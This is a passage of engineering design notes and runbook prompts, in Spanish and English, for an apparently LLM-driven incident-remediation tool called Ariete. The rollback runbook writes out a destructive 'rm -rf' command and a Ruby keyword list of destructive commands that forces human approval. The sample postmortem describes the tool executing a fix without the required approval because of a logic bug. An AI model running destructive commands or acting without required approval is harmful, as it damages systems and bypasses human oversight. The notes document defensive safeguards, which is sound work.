  - Potential: 3-4s (vs 12s)

Componente 5: LLM diagnostic call (20s)
  - Call OpenAI API with logs + context
  - LLM generates response (10-15s inference time)
  - Network round-trip latency (2-3s)
  - Current: 20s (MEDIUM)
  - Optimize: Use faster model? (gpt-4-turbo vs gpt-4o, less tokens?)
  - Tradeoff: Faster model = less accurate diagnosis
  - Decision v1: Accept 20s, v2 explore gpt-4-turbo (faster but slightly less accurate)

Componente 6: RAG retrieval (3s)
  - Vector search in pgvector (top-5 similar past incidents)
  - Embedding generation (if needed)
  - Current: 3s ✓ (fast)

Componente 7: LLM context construction (2s)
  - Assemble logs + RAG context + prompt
  - Serialize to JSON for API call
  - Current: 2s ✓ (fast)

Total: 2 + 0.5 + 5 + 12 + 20 + 3 + 2 = 44.5s (matches observed 45s)

Path to 30s target:
  - Parallel SSH commands: 12s → 4s (-8s)
  - Faster LLM model: 20s → 15s (-5s)
  - SSH connection pooling (v2): 5s → 2s (-3s)
  - Total: 44.5s → 33.5s (target 30s achievable)

Implement v1:
  1. Parallelize SSH commands (quick win, -8s)
  2. Monitor actual latencies with Prometheus
  
  If still >30s:
  3. Switch to gpt-4-turbo (-5s)
  4. Implement connection pooling (v2)
```

---

## Prompts de Operaciones

### 18. Runbook: Credential Rotation
```
Rotar SSH credentials sin downtime.

Pasos:
1. Verificar nadie ejecuta
2. [...]

¿Qué puede fallar?
```

**Ejemplo Ariete**
```
Runbook: Rotar SSH key para infrastructure endpoint

Pasos:
1. Check: ¿hay ejecuciones en progreso?
   Command: select count(*) from incidents where state='executing' and infrastructure_id=999;
   If any: wait hasta execution_timeout (30s), recheck
   
2. Disable new incident execution para este endpoint (flipped switch)
   Command: infrastructure.update(execution_disabled: true)
   Ariete: Incidents con proposed_fix se quedan en 'proposed_fix' (no auto-execute)
   
3. Add new SSH key a infrastructure record (segunda clave, ambas válidas)
   Command: infrastructure.update(encrypted_ssh_key_alt: encrypt(new_key))
   
4. Verify workers usa new key: ExecutionWorker.perform(incident_id)
   Test on staging incident (or create fake one)
   
5. Monitor logs para SSH auth errors (debe ser zero si key cabe)
   tail -f log/production.log | grep "SSH auth"
   
6. Remove old SSH key después de 7 días (grace period)
   Command: infrastructure.update(encrypted_ssh_key: nil)
   
7. Flip switch: re-enable execution
   Command: infrastructure.update(execution_disabled: false)
   
¿Qué puede fallar?

Failure 1: Operator en medio de approving durante step 2
  → Incident stuck en AwaitingApproval (approval approved pero no ejecuta)
  → Mitigation: Send notification "Maintenance, all executions paused until [time]"
  → Operator puede ver esto, re-approve cuando maintenance done

Failure 2: New key has wrong format (not valid SSH key)
  → Verification step 4 falla (SSH auth error)
  → Rollback: infrastructure.update(encrypted_ssh_key_alt: nil)
  → Don't flip switch enable, contact on-call to debug
  
Failure 3: Operator forgets to flip switch back
  → All incidents stay in proposed_fix state indefinitely
  → Monitoring: alert if >5 incidents in proposed_fix >2 hours
  → Trigger: "Execution disabled state check" (runbook step 7 reminder)

Audit trail:
  - AuditLog: action='maintenance_start', details={endpoint, reason:'credential_rotation'}
  - AuditLog: action='ssh_key_changed'
  - AuditLog: action='maintenance_end'
  
Test runbook:
  - Staging: follow all steps on staging infrastructure
  - Verify: execute test incident successfully on new key
  - Rollback: verify old key still works (step 3 adds alt key)
```

### 19. Runbook: Rollback
```
Operador aprobó "rm -rf /tmp/cache", rompió app.

Pasos rollback:
1. Notificar
2. [...]

¿Qué previene en primer lugar?
```

**Ejemplo Ariete**
```
Scenario: Operador aprobó "rm -rf /tmp/cache" (off-hours autonomy ejecutó)
  Resultado: Aplicación perdió archivos, servicio offline, clients affected
  
Rollback flow:

Step 1: Immediate triage
  - Check incident audit log: command que ejecutó, output (should be empty if delete succeeded)
  - SSH a infraestructura: verify /tmp/cache está realmente vacío
  - Assess impact: how many users affected? Services down how long?
  
Step 2: Notify stakeholders
  - Alert: "Incident X: unauthorized execution, [service] down, rolling back"
  - Escalate: page engineering team + ops
  - Status page: "Investigating data loss issue"

Step 3: Restore from backup (if applicable)
  - /tmp/cache usually ephemeral → recreate from source or resync
  - If persistent data lost → recover from database backup
  - Runbook: [link to restore procedure]
  - Time: ~5-10 minutes to restore if backups in place
  
Step 4: Prevent recurrence
  - Immediate: Remove "rm" from command allowlist (off-hours autonomy)
  - Code: command_allowlist = ['systemctl restart *', 'systemctl reload *'] (no delete)
  - Audit: Why was "rm -rf" ever in allowlist? (review approval history)
  
Step 5: Postmortem
  - Timeline: when detected, when executed, impact window
  - Root cause: dangerous command in allowlist
  - Action item: code review all allowlist entries, remove anything destructive
  
¿Qué previene en primer lugar?

Prevention layer 1: Command Allowlist
  - Don't allow "rm", "delete", "truncate", "drop" in off-hours allowlist
  - Allow only service management: systemctl restart/reload/start/stop
  
Prevention layer 2: Dangerous command detection
  - Before LLM proposes fix, scan for red flags
  - If proposed_fix includes ["rm", "delete", "truncate"], enforce human approval
  - Code:
    ```ruby
    dangerous_keywords = %w[rm delete truncate drop dd format mkfs]
    if dangerous_keywords.any? { |word| proposed_fix.include?(word) }
      incident.update(autonomous_forbidden: true)  # Even off-hours, require approval
    end
    ```

Prevention layer 3: Blast radius limits
  - Limit command scope: "/tmp/cache" not "/" or "/var" or "/opt"
  - Command validation: reject if paths outside whitelist
  
Prevention layer 4: Operator education
  - Approval widget shows: "⚠️ This command includes file deletion, be careful"
  - Require comment: "Why approving rm? Describe expected outcome"
  
Prevention layer 5: Dry-run before execution
  - Proposal: "Will delete /tmp/cache (size: 500MB, contains 50K files)"
  - Show: what would be deleted, where, impact estimate
  - Operator can review before approval
```

### 20. Postmortem Template
```
Incident: [descripción]

1. Timeline (qué/cuándo)
2. Root cause (por qué)
3. Impact (cuántos, cuánto tiempo)
4. Detection (cómo nos dimos cuenta)
5. Fix (short-term)
6. Prevention (code changes)

Asigna ownership.
```

**Ejemplo Ariete — Postmortem**
```
Incident: Ariete executed unapproved command on production infrastructure

Timeline:
  2026-10-15 23:15 — Monitoring detects nginx timeout (URL unresponsive)
  2026-10-15 23:16 — Ariete begins diagnosis (logs, service state)
  2026-10-15 23:17 — LLM proposes "systemctl restart nginx" (valid fix)
  2026-10-15 23:18 — Off-hours autonomous mode EXECUTES (should have required approval)
  2026-10-15 23:19 — Operator notices incident in audit log (post-execution)
  2026-10-15 23:20 — Restart completes, nginx recovers
  2026-10-15 23:25 — Impact window closes

Root cause:
  Off-hours autonomy check had logic error:
    if incident.detected_at.hour >= 22 || incident.detected_at.hour < 6
      execute_without_approval = true  # BUG: should also check domain.autonomous_enabled
  
  Missing guard: `domain.autonomous_enabled && time_in_window`
  Only checked time, not feature flag.
  Domain owner had autonomy DISABLED (for this domain) but Ariete ignored it.

Impact:
  - 1 service (nginx) restarted without approval
  - No customer data lost (restart is safe)
  - No permission denied (Ariete had valid SSH key)
  - But: governance violated (operator should have approved)
  - Risk: if command was destructive, impact would be high

Detection:
  - Operator reviewed audit logs (nightly routine)
  - Saw action='autonomous_execute_fix' for domain with autonomous_enabled=false
  - Escalated to on-call

Fix (short-term):
  1. Code fix: Add missing check in ExecutionWorker
     ```ruby
     if domain.autonomous_enabled && within_off_hours?
       execute_without_approval = true
     else
       require_approval = true
     end
     ```
  2. Deployed emergency patch (5 min)
  3. Verified: subsequent incidents require approval
  4. Audit log: mark incident as "approved retroactively" for compliance

Prevention (code changes):
  1. Test coverage: Add test for "autonomous execution when feature disabled"
     ```ruby
     it "requires approval even during off-hours if autonomous_enabled=false" do
       domain.update(autonomous_enabled: false)
       incident.update(detected_at: Time.parse("23:00"))  # Off-hours
       ExecutionWorker.perform(incident.id)
       expect(incident.reload.state).to eq('proposed_fix')  # Never executed
     end
     ```
  2. Code review: Add linter rule checking all autonomous decision logic
  3. Monitoring: Alert if action='autonomous_execute_fix' but domain.autonomous_enabled=false
  4. Documentation: Add comment explaining the AND condition (not OR)

Ownership:
  - Fix: @devops (implemented, deployed)
  - Test: @qa (write test, verify)
  - Monitoring: @platform (add alert)
  - Post-mortem review: @engineering-manager (1 week followup)

Lessons learned:
  - Autonomous mode has multiple guards (feature flag + time window), test all combinations
  - Audit logs caught the issue (good!), but detection was manual (operator review)
  - Future: add automated alert for "unauthorized autonomous execution"
```

---

## Meta: Cómo Usar

1. **Antes de implementar** → #4-6 para desglosar historias
2. **Antes de code review** → #10-12 para testing strategy
3. **Debugging problema** → #23-24 para root-cause
4. **Post-incident** → #20 para postmortem

Todos asumen: Rails 8, PostgreSQL, Sidekiq, security + audit non-negotiable.
Caveman style: terse, actionable, sin fluff.
